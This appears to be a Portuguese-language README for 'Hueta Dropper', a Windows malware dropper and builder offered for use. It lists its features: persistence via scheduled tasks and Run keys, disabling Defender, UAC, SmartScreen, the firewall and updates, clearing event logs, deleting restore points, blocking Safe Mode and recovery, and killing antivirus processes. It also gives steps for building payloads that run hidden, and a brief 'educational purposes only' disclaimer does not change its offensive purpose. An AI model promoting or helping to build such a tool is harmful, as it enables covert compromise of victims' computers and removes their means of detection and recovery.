# HUETA DROPPER

<p align="center">
  <img src="logo.png" alt="Hueta Dropper" width="200">
</p>

---

Um dropper que garante estabilidade total para seus arquivos e desbloqueia todas as possibilidades.

Executa com privilégios de administrador (solicitação UAC). Primeira execução:

- Copia-se para pastas ocultas e do sistema
- Adiciona ao Agendador de Tarefas (SYSTEM, no logon do usuário)
- Adiciona ao Registro (HKCU + HKLM Run)
- Limpa o sistema e implanta o payload
- Inicia o guardião em segundo plano

---

## Principais Recursos

- 🛡️ Desativa WinDefend, WdNisSvc, WdNisDrv, SecurityHealthService, wscsvc, SgrmBroker
- 🔇 Desativa Monitoramento em Tempo Real, Monitoramento Comportamental, Proteção na Nuvem (MAPS), envio de amostras
- 🔒 Desativação total do UAC
- 🖥️ SmartScreen desativado
- 🔥 Firewall desativado, MpsSvc parado, todos os perfis desligados
- 🔄 Windows Update desativado, wuauserv, UsoSvc, WaaSMedicSvc, dosvc parados + políticas bloqueadas
- 📋 EventLog, EventSystem desativados, logs limpos a cada 30 segundos
- 💾 Pontos de Restauração removidos, WinRE desativado, Modo Seguro bloqueado via BCD
- ⚡ Plano de Alta Performance forçado, suspensão/hibernação/proteção de tela desligados
- 🔧 Atualização automática de drivers desativada
- 🚫 Modo Seguro, recuperação, inicialização externa bloqueados
- 🛑 Monitora 25 processos de antivírus, término forçado

---

## INSTRUÇÕES

### Criando um Dropper

1. **Desative todos os antivírus**, vá para [download](../../raw/main/Builder.exe) e abra o `Builder.exe`
2. Vá para a primeira aba, adicione seus arquivos que precisam ser executados **em modo oculto**

> ⚠️ **AVISO.** Não coloque arquivos que precisam ser executados em modo normal no dropper. Use o descompactador após a compilação.

<p align="center">
  <img src="screen1.png" alt="Builder Dropper" width="500">
</p>

3. Clique no botão **"Build hueta.exe"** e salve o arquivo. Sua compilação está pronta!

---

### Criando um Descompactador

1. Abra o `Builder.exe`
2. Vá para a segunda aba, adicione seus arquivos que precisam ser executados **em modo normal**

<p align="center">
  <img src="screen2.png" alt="Builder Extractor" width="500">
</p>

3. Clique no botão **"Build build.exe"** e salve o arquivo. Sua compilação está pronta!

---

## Aviso Legal

**Apenas para fins educacionais.** Use por sua conta e risco.
